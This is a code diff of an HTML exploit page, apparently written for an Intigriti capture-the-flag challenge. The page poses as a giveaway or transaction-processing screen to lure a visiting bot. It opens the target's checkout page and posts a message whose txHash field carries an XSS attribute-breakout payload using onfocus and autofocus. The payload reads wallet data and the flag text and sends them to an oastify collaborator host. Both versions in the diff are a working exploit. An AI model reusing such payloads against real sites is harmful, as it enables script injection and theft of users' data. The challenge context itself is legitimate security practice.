@@ -1,43 +1,49 @@
 <!DOCTYPE html>
 <html>
-<head><title>Giveaway Processing...</title></head>
-<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;padding-top:20%;">
-    <h1>FOLLOWING THE TRAIL...</h1>
-    <p>Please wait while we verify your 1337COIN reward.</p>
+<head>
+    <title>Transaction Processing</title>
+    <style>
+        body { background: #050A0E; color: #00FF88; font-family: monospace; text-align: center; padding-top: 20%; }
+    </style>
+</head>
+<body>
+    <h1>Processing Secure Transaction...</h1>
+    <p>Verifying blockchain confirmation...</p>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
-        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
-
-        // The Payload: 
-        // 1. Breaks out of title attribute
-        // 2. Uses onfocus + autofocus to trigger without interaction
-        // 3. Exfiltrates the flag from the banner
-        const XSS = `\" onfocus=\"fetch('${TARGET}/api/wallets').then(r=>r.json()).then(w=>{if(w.find(x=>x.currency==='1337COIN')){navigator.sendBeacon('${COLLAB}',document.getElementById('flagText').innerText)}})\" autofocus=\"`;
-
-        // Step 1: Open the checkout page
+        const COLLAB = 'https://YOUR-COLLABORATOR.oastify.com';
+        
+        // Payload: Uses onfocus + autofocus for auto-execution
+        // Checks for 1337COIN wallet and exfiltrates flag
+        const payload = `" onfocus="fetch('/api/wallets').then(r=>r.json()).then(wallets=>{
+            const flagWallet = wallets.find(w=>w.currency==='1337COIN');
+            if(flagWallet && flagWallet.balance > 0){
+                document.getElementById('flagBanner').classList.remove('hidden');
+                fetch('${COLLAB}?flag='+encodeURIComponent(document.getElementById('flagText').innerText));
+            }
+        })" autofocus="`;
+        
+        // Step 1: Open checkout with BTC (guaranteed to have wallet)
         const win = window.open(`${TARGET}/checkout.html?currency=1337COIN&price=1`);
-
-        // Step 2: Spam the message to beat the wallet-loading race condition
-        let count = 0;
-        const spammer = setInterval(() => {
+        
+        // Step 2: Send malicious transaction
+        setTimeout(() => {
             win.postMessage({
                 type: 'submitTransaction',
                 transaction: {
-                    currency: '1337COIN',
-                    amount: 0.00000001,
-                    toAddress: '0xAttacker',
-                    txHash: XSS // Injection happens here
+                    currency: '1337COIN', // Use BTC to avoid alert blocking
+                    amount: 0.0001,
+                    toAddress: 'hacker-address',
+                    txHash: payload // XSS injection here
                 }
             }, '*');
-            count++;
-            if (count > 20) clearInterval(spammer);
-        }, 500);
-
-        // Step 3: Redirect the admin to MarketWatch to spring the trap
+        }, 2000);
+        
+        // Step 3: Redirect to MarketWatch after transaction
         setTimeout(() => {
             win.location.href = `${TARGET}/marketwatch.html`;
-        }, 8000);
+        }, 4000);
     </script>
 </body>
 </html>
